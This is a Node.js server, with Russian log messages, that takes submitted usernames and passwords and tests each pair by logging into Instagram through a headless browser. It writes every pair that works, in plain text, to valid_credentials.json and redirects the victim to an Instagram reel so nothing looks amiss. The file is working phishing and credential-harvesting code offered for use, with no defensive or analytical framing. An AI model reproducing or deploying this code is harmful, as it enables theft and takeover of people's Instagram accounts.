const Fastify = require("fastify");
const { chromium } = require("playwright");
const fs = require("fs");
const cors = require("@fastify/cors");

const PORT = process.env.PORT || 3000;
const DATA_FILE = "valid_credentials.json";

const app = Fastify();
app.register(cors);

function validateCredentials(username, password) {
    if (!username || !password) {
        return { valid: false, message: "Логин и пароль обязательны!" };
    }

    if (password.length < 6) {
        return { valid: false, message: "Пароль должен быть минимум 6 символов." };
    }

    const usernameRegex = /^[a-zA-Z0-9._]+$/;
    if (!usernameRegex.test(username)) {
        return { valid: false, message: "Логин должен содержать только буквы, цифры и точки/подчеркивания." };
    }

    return { valid: true };
}

function saveCredentials(username, password) {
    let credentials = [];
    if (fs.existsSync(DATA_FILE)) {
        credentials = JSON.parse(fs.readFileSync(DATA_FILE, "utf-8"));
    }
    credentials.push({ username, password });
    fs.writeFileSync(DATA_FILE, JSON.stringify(credentials, null, 2));
}

app.post("/check", async (request, reply) => {
    console.log("Новый POST-запрос на /check", request.body);

    const { username, password } = request.body;
    const validation = validateCredentials(username, password);
    if (!validation.valid) {
        console.log("Ошибка валидации:", validation.message);
        return reply.send({ error: true, message: validation.message });
    }

    console.log(`Начинаем проверку логина для пользователя: ${username}`);

    const browser = await chromium.launch({ headless: true });
    const page = await browser.newPage();

    try {
        await page.goto("https://www.instagram.com/accounts/login/");
        console.log("Загружена страница авторизации...");

        await page.waitForSelector("input[name='username']", { timeout: 5000 });
        console.log("Элементы формы авторизации найдены");

        await page.fill("input[name='username']", username);
        await page.fill("input[name='password']", password);
        await page.click("button[type='submit']");
        console.log("Кнопка 'Войти' нажата");

        // Дополнительная задержка для проверки редиректа
        await page.waitForTimeout(5000);

        // Проверка на наличие ошибок авторизации
        const errorMessage = await page.locator("div.xkmlbd1.xvs91rp.xd4r4e8.x1anpbxc.x1m39q7l.xyorhqc.x540dpk.x2b8uid").count();
        if (errorMessage > 0) {
            console.log("Ошибка входа: неверные данные.");
            await browser.close();
            return reply.send({ error: true, message: "Неверный логин или пароль" });
        }

        // Проверка на успешный редирект
        let loginSuccess = false;
        for (let i = 0; i < 10; i++) {
            await page.waitForTimeout(1000);
            const currentUrl = page.url();
            console.log("Текущий URL:", currentUrl);

            if (currentUrl !== "https://www.instagram.com/accounts/login/") {
                loginSuccess = true;
                break;
            }

            // Проверка на наличие других возможных ошибок (например, 2FA)
            const twoFactorMessage = await page.locator("div[class*='two-factor']").count();
            if (twoFactorMessage > 0) {
                console.log("Необходима двухфакторная аутентификация.");
                await browser.close();
                return reply.send({ error: true, message: "Необходима двухфакторная аутентификация" });
            }
        }

        await browser.close();

        if (loginSuccess) {
            console.log(`Пользователь ${username} успешно вошел в аккаунт.`);
            saveCredentials(username, password);
            return reply.send({ error: false, message: "Успешный вход в Instagram", redirectUrl: "https://www.instagram.com/reel/DGZvsOutpww/?igsh=MWozYjZtbWhyeHZvaA==" });
        } else {
            console.log("Ошибка входа: URL не изменился.");
            return reply.send({ error: true, message: "Неверный логин или пароль" });
        }
    } catch (error) {
        console.error("Ошибка при входе в Instagram:", error);
        await browser.close();
        return reply.send({ error: true, message: "Ошибка сервера" });
    }
});

app.get("/", async (request, reply) => {
    console.log("Новый GET-запрос на /");
    reply.send("Сервер работает!");
});

app.listen({ port: PORT, host: '0.0.0.0' }, (err, address) => {
    if (err) {
        console.error("Ошибка запуска сервера:", err);
        process.exit(1);
    }
    console.log(`Сервер запущен на ${address}`);
});
